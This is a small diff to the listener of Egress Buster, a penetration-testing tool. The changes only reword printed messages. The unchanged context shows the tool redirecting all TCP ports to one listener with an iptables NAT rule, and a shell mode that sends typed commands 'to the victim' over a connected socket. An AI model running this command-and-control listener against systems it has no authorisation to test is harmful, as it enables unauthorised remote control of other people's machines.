@@ -5,7 +5,7 @@
 # Egress Buster Listener - Written by: Dave Kennedy (ReL1K) (@HackingDave)
 #
 # Listener can only be run on Linux due to iptables support.
-# 
+#
 import SocketServer
 import subprocess
 import sys
@@ -51,7 +51,7 @@ class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
     # handle the packet
     def handle(self):
         self.data = self.request.recv(1024).strip()
-        print "[i] Connected from %s on port: %s" % (self.client_address[0], self.data)
+        print "[*] Connected from %s on port: TCP %s" % (self.client_address[0], self.data)
         if shell == "shell":
             while 1:
                 request = raw_input("Enter the command to send to the victim: ")
@@ -72,7 +72,7 @@ class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pa
 if __name__ == "__main__":
 
     try:
-        print "[*] Inserting iptables to redirect all ports to port %s" % port
+        print "[*] Inserting iptables rule to redirect **all TCP ports** to port TCP %s" % port
         subprocess.Popen(
             " iptables -t nat -A PREROUTING -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (
             eth, ipaddr, port), shell=True).wait()
@@ -81,7 +81,7 @@ if __name__ == "__main__":
         socketserver_thread = threading.Thread(target=socketserver.serve_forever)
         socketserver_thread.setDaemon(True)
         socketserver_thread.start()
-        print "[*] Listening on all ports now... Press control-c when finished."
+        print "[*] Listening on all TCP ports now... Press control-c when finished."
 
         while 1:
             try:
